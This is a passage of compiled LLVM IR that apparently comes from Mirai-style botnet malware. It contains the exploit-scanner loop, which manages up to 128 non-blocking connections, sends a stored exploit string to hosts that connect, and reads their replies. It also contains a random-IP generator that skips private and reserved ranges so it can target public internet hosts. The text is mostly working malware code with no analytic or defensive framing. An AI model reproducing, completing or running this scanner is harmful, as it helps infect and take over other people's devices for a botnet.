  %377 = load i32, i32* %1, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %376, i64 %378
  store %struct.exploit_scanner_connection* %379, %struct.exploit_scanner_connection** %7, align 8
  %380 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %381 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %380, i32 0, i32 2
  %382 = load i32, i32* %381, align 8
  %383 = icmp ne i32 %382, 0
  br i1 %383, label %384, label %404

; <label>:384:                                    ; preds = %375
  %385 = load i32, i32* @exploit_fake_time, align 4
  %386 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %387 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %386, i32 0, i32 1
  %388 = load i32, i32* %387, align 4
  %389 = sub i32 %385, %388
  %390 = load i32, i32* %28, align 4
  %391 = icmp ugt i32 %389, %390
  br i1 %391, label %392, label %404

; <label>:392:                                    ; preds = %384
  %393 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %394 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %393, i32 0, i32 0
  %395 = load i32, i32* %394, align 8
  %396 = call i32 @close(i32 %395)
  %397 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %398 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %397, i32 0, i32 0
  store i32 -1, i32* %398, align 8
  %399 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %400 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %399, i32 0, i32 2
  store i32 0, i32* %400, align 8
  %401 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %402 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %401, i32 0, i32 6
  %403 = getelementptr inbounds [256 x i8], [256 x i8]* %402, i32 0, i32 0
  call void @util_zero(i8* %403, i32 256)
  br label %478

; <label>:404:                                    ; preds = %384, %375
  %405 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %405, i32 0, i32 2
  %407 = load i32, i32* %406, align 8
  %408 = icmp eq i32 %407, 1
  br i1 %408, label %419, label %409

; <label>:409:                                    ; preds = %404
  %410 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %411 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %410, i32 0, i32 2
  %412 = load i32, i32* %411, align 8
  %413 = icmp eq i32 %412, 3
  br i1 %413, label %419, label %414

; <label>:414:                                    ; preds = %409
  %415 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %416 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %415, i32 0, i32 2
  %417 = load i32, i32* %416, align 8
  %418 = icmp eq i32 %417, 4
  br i1 %418, label %419, label %445

; <label>:419:                                    ; preds = %414, %409, %404
  %420 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %421 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = srem i32 %422, 64
  %424 = zext i32 %423 to i64
  %425 = shl i64 1, %424
  %426 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %427 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %427, i32 0, i32 0
  %429 = load i32, i32* %428, align 8
  %430 = sdiv i32 %429, 64
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds [16 x i64], [16 x i64]* %426, i64 0, i64 %431
  %433 = load i64, i64* %432, align 8
  %434 = or i64 %433, %425
  store i64 %434, i64* %432, align 8
  %435 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %436 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 8
  %438 = load i32, i32* %12, align 4
  %439 = icmp sgt i32 %437, %438
  br i1 %439, label %440, label %444

; <label>:440:                                    ; preds = %419
  %441 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %442 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %441, i32 0, i32 0
  %443 = load i32, i32* %442, align 8
  store i32 %443, i32* %12, align 4
  br label %444

; <label>:444:                                    ; preds = %440, %419
  br label %477

; <label>:445:                                    ; preds = %414
  %446 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %447 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %446, i32 0, i32 2
  %448 = load i32, i32* %447, align 8
  %449 = icmp ne i32 %448, 0
  br i1 %449, label %450, label %476

; <label>:450:                                    ; preds = %445
  %451 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %452 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 8
  %454 = srem i32 %453, 64
  %455 = zext i32 %454 to i64
  %456 = shl i64 1, %455
  %457 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %458 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %459 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 8
  %461 = sdiv i32 %460, 64
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds [16 x i64], [16 x i64]* %457, i64 0, i64 %462
  %464 = load i64, i64* %463, align 8
  %465 = or i64 %464, %456
  store i64 %465, i64* %463, align 8
  %466 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %467 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 8
  %469 = load i32, i32* %11, align 4
  %470 = icmp sgt i32 %468, %469
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %450
  %472 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %473 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %472, i32 0, i32 0
  %474 = load i32, i32* %473, align 8
  store i32 %474, i32* %11, align 4
  br label %475

; <label>:475:                                    ; preds = %471, %450
  br label %476

; <label>:476:                                    ; preds = %475, %445
  br label %477

; <label>:477:                                    ; preds = %476, %444
  br label %478

; <label>:478:                                    ; preds = %477, %392
  %479 = load i32, i32* %1, align 4
  %480 = add nsw i32 %479, 1
  store i32 %480, i32* %1, align 4
  br label %372

; <label>:481:                                    ; preds = %372
  %482 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %482, align 8
  %483 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %483, align 8
  %484 = load i32, i32* %12, align 4
  %485 = load i32, i32* %11, align 4
  %486 = icmp sgt i32 %484, %485
  br i1 %486, label %487, label %489

; <label>:487:                                    ; preds = %481
  %488 = load i32, i32* %12, align 4
  br label %491

; <label>:489:                                    ; preds = %481
  %490 = load i32, i32* %11, align 4
  br label %491

; <label>:491:                                    ; preds = %489, %487
  %492 = phi i32 [ %488, %487 ], [ %490, %489 ]
  %493 = add nsw i32 1, %492
  %494 = call i32 @select(i32 %493, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %494, i32* %13, align 4
  %495 = call i64 @time(i64* null) #6
  %496 = trunc i64 %495 to i32
  store i32 %496, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %497

; <label>:497:                                    ; preds = %715, %491
  %498 = load i32, i32* %1, align 4
  %499 = icmp slt i32 %498, 128
  br i1 %499, label %500, label %718

; <label>:500:                                    ; preds = %497
  %501 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %502 = load i32, i32* %1, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %501, i64 %503
  store %struct.exploit_scanner_connection* %504, %struct.exploit_scanner_connection** %7, align 8
  %505 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %506 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 8
  %508 = icmp eq i32 %507, -1
  br i1 %508, label %509, label %510

; <label>:509:                                    ; preds = %500
  br label %715

; <label>:510:                                    ; preds = %500
  %511 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %512 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %513 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %512, i32 0, i32 0
  %514 = load i32, i32* %513, align 8
  %515 = sdiv i32 %514, 64
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds [16 x i64], [16 x i64]* %511, i64 0, i64 %516
  %518 = load i64, i64* %517, align 8
  %519 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %520 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %519, i32 0, i32 0
  %521 = load i32, i32* %520, align 8
  %522 = srem i32 %521, 64
  %523 = zext i32 %522 to i64
  %524 = shl i64 1, %523
  %525 = and i64 %518, %524
  %526 = icmp ne i64 %525, 0
  br i1 %526, label %527, label %597

; <label>:527:                                    ; preds = %510
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %528 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %529 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 8
  %531 = bitcast i32* %29 to i8*
  %532 = call i32 @getsockopt(i32 %530, i32 1, i32 4, i8* %531, i32* %31) #6
  store i32 %532, i32* %30, align 4
  %533 = load i32, i32* %29, align 4
  %534 = icmp eq i32 %533, 0
  br i1 %534, label %535, label %587

; <label>:535:                                    ; preds = %527
  %536 = load i32, i32* %30, align 4
  %537 = icmp eq i32 %536, 0
  br i1 %537, label %538, label %587

; <label>:538:                                    ; preds = %535
  %539 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %540 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %539, i32 0, i32 2
  %541 = load i32, i32* %540, align 8
  %542 = icmp eq i32 %541, 3
  br i1 %542, label %543, label %568

; <label>:543:                                    ; preds = %538
  %544 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %545 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %544, i32 0, i32 8
  %546 = getelementptr inbounds [2560 x i8], [2560 x i8]* %545, i32 0, i32 0
  %547 = call i32 @util_strcpy(i8* %546, i8* getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i32 0, i32 0))
  %548 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %549 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %548, i32 0, i32 0
  %550 = load i32, i32* %549, align 8
  %551 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %552 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %551, i32 0, i32 8
  %553 = getelementptr inbounds [2560 x i8], [2560 x i8]* %552, i32 0, i32 0
  %554 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %555 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %554, i32 0, i32 8
  %556 = getelementptr inbounds [2560 x i8], [2560 x i8]* %555, i32 0, i32 0
  %557 = call i32 @util_strlen(i8* %556)
  %558 = sext i32 %557 to i64
  %559 = call i64 @send(i32 %550, i8* %553, i64 %558, i32 16384)
  %560 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %561 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %560, i32 0, i32 8
  %562 = getelementptr inbounds [2560 x i8], [2560 x i8]* %561, i32 0, i32 0
  call void @util_zero(i8* %562, i32 2560)
  %563 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %564 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %563, i32 0, i32 6
  %565 = getelementptr inbounds [256 x i8], [256 x i8]* %564, i32 0, i32 0
  call void @util_zero(i8* %565, i32 256)
  %566 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %566, i32 0, i32 2
  store i32 4, i32* %567, align 8
  br label %715

; <label>:568:                                    ; preds = %538
  %569 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %570 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %569, i32 0, i32 2
  %571 = load i32, i32* %570, align 8
  %572 = icmp eq i32 %571, 4
  br i1 %572, label %573, label %582

; <label>:573:                                    ; preds = %568
  %574 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %575 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %574, i32 0, i32 0
  %576 = load i32, i32* %575, align 8
  %577 = call i32 @close(i32 %576)
  %578 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %579 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %578, i32 0, i32 0
  store i32 -1, i32* %579, align 8
  %580 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %581 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %580, i32 0, i32 2
  store i32 0, i32* %581, align 8
  br label %715

; <label>:582:                                    ; preds = %568
  %583 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %584 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %583, i32 0, i32 2
  store i32 3, i32* %584, align 8
  br label %585

; <label>:585:                                    ; preds = %582
  br label %586

; <label>:586:                                    ; preds = %585
  br label %596

; <label>:587:                                    ; preds = %535, %527
  %588 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %589 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %588, i32 0, i32 0
  %590 = load i32, i32* %589, align 8
  %591 = call i32 @close(i32 %590)
  %592 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %593 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %592, i32 0, i32 0
  store i32 -1, i32* %593, align 8
  %594 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %595 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %594, i32 0, i32 2
  store i32 0, i32* %595, align 8
  br label %715

; <label>:596:                                    ; preds = %586
  br label %597

; <label>:597:                                    ; preds = %596, %510
  %598 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %599 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %600 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 8
  %602 = sdiv i32 %601, 64
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds [16 x i64], [16 x i64]* %598, i64 0, i64 %603
  %605 = load i64, i64* %604, align 8
  %606 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %607 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %606, i32 0, i32 0
  %608 = load i32, i32* %607, align 8
  %609 = srem i32 %608, 64
  %610 = zext i32 %609 to i64
  %611 = shl i64 1, %610
  %612 = and i64 %605, %611
  %613 = icmp ne i64 %612, 0
  br i1 %613, label %614, label %714

; <label>:614:                                    ; preds = %597
  br label %615

; <label>:615:                                    ; preds = %695, %676, %614
  store i32 0, i32* %32, align 4
  %616 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %617 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %616, i32 0, i32 2
  %618 = load i32, i32* %617, align 8
  %619 = icmp eq i32 %618, 0
  br i1 %619, label %620, label %621

; <label>:620:                                    ; preds = %615
  br label %713

; <label>:621:                                    ; preds = %615
  %622 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %623 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %622, i32 0, i32 5
  %624 = load i32, i32* %623, align 4
  %625 = icmp eq i32 %624, 256
  br i1 %625, label %626, label %638

; <label>:626:                                    ; preds = %621
  %627 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %628 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %627, i32 0, i32 6
  %629 = getelementptr inbounds [256 x i8], [256 x i8]* %628, i32 0, i32 0
  %630 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %631 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %630, i32 0, i32 6
  %632 = getelementptr inbounds [256 x i8], [256 x i8]* %631, i32 0, i32 0
  %633 = getelementptr inbounds i8, i8* %632, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %629, i8* %633, i64 192, i32 1, i1 false)
  %634 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %634, i32 0, i32 5
  %636 = load i32, i32* %635, align 4
  %637 = sub nsw i32 %636, 64
  store i32 %637, i32* %635, align 4
  br label %638

; <label>:638:                                    ; preds = %626, %621
  %639 = call i32* @__errno_location() #9
  store i32 0, i32* %639, align 4
  %640 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %641 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 8
  %643 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %644 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %643, i32 0, i32 6
  %645 = getelementptr inbounds [256 x i8], [256 x i8]* %644, i32 0, i32 0
  %646 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %646, i32 0, i32 5
  %648 = load i32, i32* %647, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds i8, i8* %645, i64 %649
  %651 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %652 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %651, i32 0, i32 5
  %653 = load i32, i32* %652, align 4
  %654 = sub nsw i32 256, %653
  %655 = call i32 @exploit_recv_strip_null(i32 %642, i8* %650, i32 %654, i32 16384)
  store i32 %655, i32* %32, align 4
  %656 = load i32, i32* %32, align 4
  %657 = icmp eq i32 %656, 0
  br i1 %657, label %658, label %660

; <label>:658:                                    ; preds = %638
  %659 = call i32* @__errno_location() #9
  store i32 104, i32* %659, align 4
  store i32 -1, i32* %32, align 4
  br label %660

; <label>:660:                                    ; preds = %658, %638
  %661 = load i32, i32* %32, align 4
  %662 = icmp eq i32 %661, -1
  br i1 %662, label %663, label %695

; <label>:663:                                    ; preds = %660
  %664 = call i32* @__errno_location() #9
  %665 = load i32, i32* %664, align 4
  %666 = icmp ne i32 %665, 11
  br i1 %666, label %667, label %694

; <label>:667:                                    ; preds = %663
  %668 = call i32* @__errno_location() #9
  %669 = load i32, i32* %668, align 4
  %670 = icmp ne i32 %669, 11
  br i1 %670, label %671, label %694

; <label>:671:                                    ; preds = %667
  %672 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %673 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %672, i32 0, i32 2
  %674 = load i32, i32* %673, align 8
  %675 = icmp eq i32 %674, 3
  br i1 %675, label %676, label %682

; <label>:676:                                    ; preds = %671
  %677 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %678 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 8
  %680 = call i32 @close(i32 %679)
  %681 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %681)
  br label %615

; <label>:682:                                    ; preds = %671
  %683 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %684 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 8
  %686 = call i32 @close(i32 %685)
  %687 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %688 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %687, i32 0, i32 0
  store i32 -1, i32* %688, align 8
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 2
  store i32 0, i32* %690, align 8
  %691 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %692 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %691, i32 0, i32 6
  %693 = getelementptr inbounds [256 x i8], [256 x i8]* %692, i32 0, i32 0
  call void @util_zero(i8* %693, i32 256)
  br label %694

; <label>:694:                                    ; preds = %682, %667, %663
  br label %713

; <label>:695:                                    ; preds = %660
  %696 = load i32, i32* %32, align 4
  %697 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %698 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %697, i32 0, i32 5
  %699 = load i32, i32* %698, align 4
  %700 = add nsw i32 %699, %696
  store i32 %700, i32* %698, align 4
  %701 = load i32, i32* @exploit_fake_time, align 4
  %702 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %703 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %702, i32 0, i32 1
  store i32 %701, i32* %703, align 4
  %704 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %705 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %704, i32 0, i32 6
  %706 = getelementptr inbounds [256 x i8], [256 x i8]* %705, i32 0, i32 0
  %707 = call i32 @util_strlen(i8* %706)
  store i32 %707, i32* %33, align 4
  %708 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %709 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %708, i32 0, i32 6
  %710 = load i32, i32* %33, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [256 x i8], [256 x i8]* %709, i64 0, i64 %711
  store i8 0, i8* %712, align 1
  br label %615

; <label>:713:                                    ; preds = %694, %620
  br label %714

; <label>:714:                                    ; preds = %713, %597
  br label %715

; <label>:715:                                    ; preds = %714, %587, %573, %543, %509
  %716 = load i32, i32* %1, align 4
  %717 = add nsw i32 %716, 1
  store i32 %717, i32* %1, align 4
  br label %497

; <label>:718:                                    ; preds = %497
  br label %137
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  store i8 0, i8* %2, align 1
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  br label %6

; <label>:6:                                      ; preds = %163, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = call i64 @time(i64* null) #6
  %9 = trunc i64 %8 to i32
  call void @srand(i32 %9) #6
  %10 = load i32, i32* %1, align 4
  %11 = and i32 %10, 255
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* %2, align 1
  %13 = load i32, i32* %1, align 4
  %14 = lshr i32 %13, 8
  %15 = and i32 %14, 255
  %16 = trunc i32 %15 to i8
  store i8 %16, i8* %3, align 1
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 16
  %19 = and i32 %18, 255
  %20 = trunc i32 %19 to i8
  store i8 %20, i8* %4, align 1
  %21 = load i32, i32* %1, align 4
  %22 = lshr i32 %21, 24
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  store i8 %24, i8* %5, align 1
  br label %25

; <label>:25:                                     ; preds = %6
  %26 = load i8, i8* %2, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 127
  br i1 %28, label %163, label %29

; <label>:29:                                     ; preds = %25
  %30 = load i8, i8* %2, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %163, label %33

; <label>:33:                                     ; preds = %29
  %34 = load i8, i8* %2, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 3
  br i1 %36, label %163, label %37

; <label>:37:                                     ; preds = %33
  %38 = load i8, i8* %2, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 15
  br i1 %40, label %163, label %41

; <label>:41:                                     ; preds = %37
  %42 = load i8, i8* %2, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 16
  br i1 %44, label %163, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %2, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 56
  br i1 %48, label %163, label %49

; <label>:49:                                     ; preds = %45
  %50 = load i8, i8* %2, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 10
  br i1 %52, label %163, label %53

; <label>:53:                                     ; preds = %49
  %54 = load i8, i8* %2, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 192
  br i1 %56, label %57, label %61

; <label>:57:                                     ; preds = %53
  %58 = load i8, i8* %3, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 168
  br i1 %60, label %163, label %61

; <label>:61:                                     ; preds = %57, %53
  %62 = load i8, i8* %2, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %73

; <label>:65:                                     ; preds = %61
  %66 = load i8, i8* %3, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sge i32 %67, 16
  br i1 %68, label %69, label %73

; <label>:69:                                     ; preds = %65
  %70 = load i8, i8* %3, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %71, 32
  br i1 %72, label %163, label %73

; <label>:73:                                     ; preds = %69, %65, %61
  %74 = load i8, i8* %2, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 100
  br i1 %76, label %77, label %85

; <label>:77:                                     ; preds = %73
  %78 = load i8, i8* %3, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sge i32 %79, 64
  br i1 %80, label %81, label %85

; <label>:81:                                     ; preds = %77
  %82 = load i8, i8* %3, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp slt i32 %83, 127
  br i1 %84, label %163, label %85

; <label>:85:                                     ; preds = %81, %77, %73
  %86 = load i8, i8* %2, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 169
  br i1 %88, label %89, label %93

; <label>:89:                                     ; preds = %85
  %90 = load i8, i8* %3, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sgt i32 %91, 254
  br i1 %92, label %163, label %93

; <label>:93:                                     ; preds = %89, %85
  %94 = load i8, i8* %2, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 198
  br i1 %96, label %97, label %105

; <label>:97:                                     ; preds = %93
  %98 = load i8, i8* %3, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sge i32 %99, 18
  br i1 %100, label %101, label %105

; <label>:101:                                    ; preds = %97
  %102 = load i8, i8* %3, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %103, 20
  br i1 %104, label %163, label %105

